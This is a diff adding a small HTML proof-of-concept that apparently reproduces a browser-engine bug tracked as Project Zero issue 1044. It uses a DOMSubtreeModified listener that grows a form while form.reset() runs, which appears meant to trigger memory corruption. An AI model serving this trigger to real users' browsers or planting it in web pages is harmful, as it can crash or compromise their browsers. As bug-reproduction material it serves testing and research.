@@ -1,0 +1,27 @@
+<!--Tested on 5.5.1-->
+<!--Bug tested: https://bugs.chromium.org/p/project-zero/issues/detail?id=1044-->
+<!--Result: Run successfully (possible)-->
+<script>
+
+function go() {
+
+  output.value = "aaa";
+  output.appendChild(inserted_div);
+
+  document.getElementById("output").addEventListener('DOMSubtreeModified', function () {
+    for(var i=0; i<20; i++) {
+      form.appendChild(document.createElement("input"));
+    }
+  }, false);
+
+  form.reset();
+  console.log("test");
+}
+
+</script>
+<body onload=go()>
+<div id="inserted_div">foo</div>
+<form id="form" onchange="eventhandler()">
+<input type="text" value="foo">
+<output id="output" oninput="eventhandler()"></output>
+<input type="text" value="foo">
